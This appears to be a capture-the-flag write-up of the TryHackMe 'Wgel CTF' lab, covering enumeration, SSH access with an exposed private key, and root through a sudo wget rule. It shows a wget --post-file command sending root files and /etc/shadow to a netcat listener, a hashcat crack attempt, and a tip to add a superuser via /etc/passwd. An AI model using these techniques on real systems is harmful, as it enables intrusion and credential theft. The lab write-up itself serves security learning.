---
title: "Wgel CTF"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="wgel.png" alt="Wgel CTF" style="width:200px" >}}


## Enumeration

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 11374, Words: 3512, Lines: 379]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
sitemap                 [Status: 301, Size: 314, Words: 20, Lines: 10]


/sitemap

.ssh                    [Status: 301, Size: 319, Words: 20, Lines: 10]
css                     [Status: 301, Size: 318, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 320, Words: 20, Lines: 10]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10]
```

visit `sitemap` directory and get to "unapp" template page
fuzz again and in `.ssh` dir you have an `id_rsa` key

we know what to do

```bash
└──╼ $python2 /usr/share/john/ssh2john.py -w=/usr/share/wordlists/rockyou.txt id_rsa > id_john
id_rsa has no password!
```

wait what? I don't even know what user I should ssh as...let's go back
folks you remember how we insist all the time on ALWAYS checking source code?

It was in `/index.html`...yes that default index page for apache servers

```html
        <pre>
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf


 <!-- Jessie don't forget to udate the webiste -->
          </pre>

```

Now we ssh as `jessie`...Don't forget to fix permissions on the key

```bash
└──╼ $chmod 600 id_rsa

└──╼ $ssh jessie@10.10.92.232 -i id_rsa
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$
```

```bash
jessie@CorpOne:~/Documents$ cat user_flag.txt
jessie_flag_suddenly_appears
```
## Privilege Escalation

```bash
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

wget unh? sounds easy

Notice how we could probably just `su` to root if we had jessie's sudo password

ok gtfobins say we can download root files...so if the root flag is in the same format as
user flag we get `/root/root_flag.txt`

You can use `find` to confirm that

set a netcat listener on your side

```bash
jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.8.226.203:2311
--2021-11-27 15:27:02--  http://10.8.226.203:2311/
Connecting to 10.8.226.203:2311... connected.
HTTP request sent, awaiting response...
```

```bash
└──╼ $nc -lnvp 2311
listening on [any] 2311 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 58212
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.8.226.203:2311
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

root_flag_goes_here
```

And we got root flag! at this point we could just call it a day...
But there is always another possibility
if we can use `wget` to read files we might as well read interesting ones

`/etc/shadow`

```bash
...
kernoops:*:17954:0:99999:7:::
pulse:*:17954:0:99999:7:::
rtkit:*:17954:0:99999:7:::
saned:*:17954:0:99999:7:::
usbmux:*:17954:0:99999:7:::
jessie:$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.:18195:0:99999:7:::
sshd:*:18195:0:99999:7:::
```
ha! jessie's hash! those are crackable!

looks like sha-512crypt

```bash
└──╼ $hashcat -m 1800 '$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.' /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
```
well its gonna take too long and I don't have that patience now

But feel free to explore. What I liked the most about this room was the multiple
ways to escalate

By example there is also a possibility to add a new superuser to `/etc/passswd`
You download, modify and upload the file...
If you are curious enough you will find another way
